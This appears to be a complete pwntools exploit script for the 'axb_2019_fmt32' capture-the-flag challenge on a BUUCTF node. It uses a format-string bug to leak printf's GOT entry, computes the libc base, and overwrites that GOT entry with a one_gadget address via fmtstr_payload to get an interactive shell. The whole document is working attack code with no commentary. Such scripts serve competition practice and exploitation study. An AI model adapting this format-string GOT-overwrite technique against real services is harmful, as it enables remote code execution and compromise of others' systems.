from pwn import *
r = remote('node3.buuoj.cn',27047)
elf = ELF('./axb_2019_fmt32')
libc = ELF('./libc-2.23.so')
printf_got = elf.got['printf']
r.recvuntil('me:')
r.sendline("%9$s#" + p32(printf_got))
r.recvuntil('Repeater:')
puts_leak = r.recv(4)
libc_base = u32(puts_leak)-libc.sym['printf']
log.success(hex(libc_base))
one = libc_base + 0x3a80c
payload = 'a'+fmtstr_payload(8,{0x804A014:one},numbwritten = 10)
r.recvuntil('me:')
r.sendline(payload)
r.interactive()